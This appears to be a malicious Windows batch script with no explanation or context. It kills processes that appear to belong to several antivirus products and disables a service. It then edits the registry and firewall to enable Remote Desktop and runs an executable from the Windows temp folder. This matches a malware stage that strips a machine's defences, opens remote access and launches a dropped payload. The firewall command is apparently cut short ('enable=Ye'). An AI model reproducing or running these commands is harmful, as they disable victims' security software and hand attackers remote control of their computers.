
echo 7
echo 7
taskkill /im csrss_tc.exe /f
taskkill /im kwsprod.exe /f
taskkill /im avkwctl.exe /f
taskkill /im rnav.exe /f
taskkill /im crssvc.exe /f
sc config CSAuth start= disabled
taskkill /im vsserv.exe /f
taskkill /im ppmcativedetection.exe /f

taskkill /im sahookmain.exe /f
taskkill /im mcinfo.exe /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Ye
c:\windows\temp\sss.exe

